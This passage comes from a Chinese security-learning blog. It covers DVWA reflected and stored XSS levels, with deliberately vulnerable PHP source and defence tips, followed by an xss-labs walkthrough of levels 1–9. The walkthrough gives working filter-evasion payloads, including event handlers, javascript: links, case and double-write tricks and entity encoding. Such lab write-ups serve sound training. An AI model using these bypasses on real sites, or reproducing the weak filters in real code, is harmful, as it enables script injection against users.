class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>preg_replace — 执行一个正则表达式的搜索和替换</p><p>添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311214122921.png" alt="image-20230311214122921"></p><p>impossible</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p><ul><li>某类字符在 HTML 中有特殊用处，如需保持原意，需要用 HTML 实体来表达。 本函数会返回字符转义后的表达。 如需转换子字符串中所有关联的名称实体，使用 <a href="https://www.php.net/manual/zh/function.htmlentities.php">htmlentities()</a> 代替本函数。</li></ul><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311214358573.png" alt="image-20230311214358573"></p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>未进行过滤，直接写入xss代码</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311215448348.png" alt="image-20230311215448348"></p><p>medium</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>addslashes(string) ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ’ 、” 、\ 、NULL</p><p>strip_tags(string) ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</p><p>htmlspecialchars(string)： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p><p>根据源码可以看出message已经被过滤，所以只能在name下手</p><p>使用大小写绕过str_replace</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311221528661.png" alt="image-20230311221528661"></p><p>被限制长度最大为10，改为100</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311221746474.png" alt="image-20230311221746474"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311221854152.png" alt="image-20230311221854152"></p><p>high</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>写入xss就可以，过滤了script，使用img等就可以</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311224056647.png" alt="image-20230311224056647"></p><p>impossible</p><p>只要使用htmlspecialchars(string)将name和massage都转化为实体，过滤就不存在xss漏洞</p><h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><p>1、在前端js对输入的字符使用htmlspecialchars函数将输入内容html实体化</p><p>2、尽量采用白名单策略，只允许特定字符输入，并在前端过滤掉#字符</p><p>3、采用黑名单过滤特殊字符，如script、&lt;&gt;、&lt;、alert等</p><p>4、将重要的cookie设置为http only，防止黑客通过JavaScript的document.cookie盗取cookie值</p><p>5、过滤javascript的on事件，如onclick、onload、onerror等</p></ImG></script>]]></content>
    
    
    <categories>
      
      <category>xss</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/03/15/xss-labs/"/>
    <url>/2023/03/15/xss-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><script>alert('xss')</script><p>没有经过特殊的处理，直接返回</p><p>参数会插入到标题中</p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>第二关多了搜索框，第一关的语句输入</p><p><img src="/2023/03/15/xss-labs/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230315220427239.png" alt="image-20230315220427239"></p><p>返回语句但是不显示过关，看一下源代码</p><p><img src="/2023/03/15/xss-labs/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230315220644774.png" alt="image-20230315220644774"></p><p>可以选择先闭合input标签然后输入语句</p><p>value是双引号闭合</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>输入第二关的语句查看源代码</p><p><img src="/2023/03/15/xss-labs/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230315220939136.png" alt="image-20230315220939136"></p><p>这是可以考虑单引号加onmouseover</p><p> onmouseover事件：指鼠标移动都某个指点的HTML标签上，会出现指定的效果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onmouseover=&#x27;alert(/xss/)<br>&#x27; onmouseover=javascript:alert(1) &#x27;<br></code></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>这个题的value的闭合方式是双引号所以这个题转变为双引号即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;onmouseover=&quot;alert(/xss/)<br>&quot;onmouseover=javascript:alert(1)&quot;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/xss-labs/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230315222335358.png" alt="image-20230315222335358"></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>将第二题和第三题的语句输入查看源代码</p><p><img src="/2023/03/15/xss-labs/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230315222518099.png" alt="image-20230315222518099"></p><p><img src="/2023/03/15/xss-labs/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230315222552011.png" alt="image-20230315222552011"></p><p>使用javascript伪协议<a href="https://www.cnblogs.com/lcyuhe/p/6409379.html">JavaScript中伪协议 - #天行健# - 博客园 (cnblogs.com)</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><p>构造闭合后新建一个a标签，在其中使用伪协议进行绕过。</p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p><img src="/2023/03/15/xss-labs/image-20230316231027974.png" alt="image-20230316231027974"></p><p>经过测试，大小写可以绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p><img src="/2023/03/15/xss-labs/image-20230316231536484.png" alt="image-20230316231536484"></p><p>经过测试前几个语句发现，有的被过滤有的不能执行，猜测可能可以使用双写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p><img src="/2023/03/15/xss-labs/image-20230316231922512.png" alt="image-20230316231922512"></p><p>经过测试大小写，双写等都进行了过滤。使用之前介绍的编码绕过，这里使用unicode绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">编码前<br><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)<br>编码后<br>&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">120</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">41</span>; <br></code></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p><img src="/2023/03/15/xss-labs/image-20230318110254828.png" alt="image-20230318110254828"></p><p><img src="/2023/03/15/xss-labs/image-20230318110419747.png" alt="image-20230318110419747"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">javascript:alert(&#x27;xss&#x27;)http://www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/xss-labs/image-20230318110533849.png" alt="image-20230318110533849"></p><p>使用unicode编码http前边的语句，但是发现不能成功的返回，经过查资料发现需要将http:&#x2F;&#x2F;注释掉</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#39;</span><span 